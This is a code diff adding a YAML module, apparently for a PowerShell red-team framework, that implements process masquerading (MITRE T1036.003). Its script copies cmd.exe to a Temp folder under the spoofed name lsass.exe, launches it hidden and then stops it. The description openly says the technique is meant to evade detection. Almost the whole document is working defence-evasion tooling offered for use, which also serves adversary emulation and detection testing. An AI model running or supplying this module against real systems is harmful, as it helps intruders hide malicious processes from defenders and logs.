@@ -1,0 +1,84 @@
+name: Rename-SystemUtilities
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Copies a system utility to a new location with a spoofed name to
+  masquerade as a different process. This technique is commonly used
+  to evade detection by running tools like cmd.exe or powershell.exe
+  under a different name such as lsass.exe, svchost.exe, or
+  notepad.exe. The renamed binary retains its original functionality
+  while appearing as a different process in task lists and logs.
+software: ''
+tactics: [TA0005]
+techniques: [T1036.003]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: SourceBinary
+    description: Path to the system binary to copy.
+    required: false
+    value: 'C:\Windows\System32\cmd.exe'
+  - name: DestinationPath
+    description: Directory to copy the binary to.
+    required: false
+    value: 'C:\Windows\Temp'
+  - name: DestinationName
+    description: New filename for the copied binary.
+    required: false
+    value: 'lsass.exe'
+  - name: Execute
+    description: Execute the renamed binary after copying (true/false).
+    required: false
+    value: 'true'
+    suggested_values:
+      - 'true'
+      - 'false'
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Rename-SystemUtilities {
+      param(
+          [string]$SourceBinary = "C:\Windows\System32\cmd.exe",
+          [string]$DestinationPath = "C:\Windows\Temp",
+          [string]$DestinationName = "lsass.exe",
+          [string]$Execute = "true"
+      )
+
+      if (-not (Test-Path $SourceBinary)) {
+          Write-Output "[-] Source binary not found: $SourceBinary"
+          return
+      }
+
+      $destFile = Join-Path $DestinationPath $DestinationName
+
+      Copy-Item $SourceBinary -Destination $destFile -Force
+      Write-Output "[+] Copied $SourceBinary to $destFile"
+
+      if ($Execute.ToLower() -eq "true") {
+          try {
+              $proc = Start-Process -FilePath $destFile -PassThru -WindowStyle Hidden
+              Write-Output "[+] Launched $destFile (PID: $($proc.Id))"
+              Start-Sleep -Seconds 2
+              Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
+              Write-Output "[+] Process stopped."
+          } catch {
+              Write-Output "[-] Failed to execute: $_"
+          }
+      }
+  }
+script_end: Rename-SystemUtilities -SourceBinary "{{ SourceBinary }}" -DestinationPath
+  "{{ DestinationPath }}" -DestinationName "{{ DestinationName }}" -Execute "{{ Execute
+  }}" {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
